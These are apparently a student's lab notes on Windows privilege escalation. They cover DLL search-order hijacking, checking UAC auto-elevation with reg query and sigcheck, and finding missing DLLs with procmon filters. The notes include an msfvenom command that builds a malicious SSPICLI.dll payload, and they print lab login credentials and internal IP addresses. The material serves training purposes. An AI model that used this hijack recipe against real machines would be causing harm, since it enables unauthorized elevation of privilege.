# Windows Exploitation
## STACK INFO
```
--Stack Number
  5

--Username
CODA-503-M

--Password
Gx1LjlSgOgQJJMy

Boxes
Student - Password
--Linux ops
10.50.31.135
 
--Windows
10.50.24.133

--Jump
10.50.27.155

--Password
Gx1LjlSgOgQJJMy

--CTFd
http://10.50.20.30:8000/resources
```
## DLL Search Order
```
Executables check the following locations (in successive order):


    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs

    The directory the the Application was run from

    The directory specified in in the C+ function GetSystemDirectory()

    The directory specified in the C+ function GetWindowsDirectory()

    The current directory
```
## Checking UAC Settings
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
```
## Run Permissions
```
.\sigcheck.exe -m -accepteula C:\Windows\System32\eventvwr.exe
## level="highestAvailable"
## <autoElevate>true/false<\autoElevate>
## <requestExecutionLevel level="asInvoker" 
```
## Demo Notes
```
Run procmonhttps://live.sysinternals.com/
-- filters ---
process name contains filename.exe
path contains .dll
result is NAME NOT FOUND
-------
run executable

LINOPS> msfvenom -p windows/exec CMD='cmd.exe C/ "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
Windows> SCP from LinOps
```
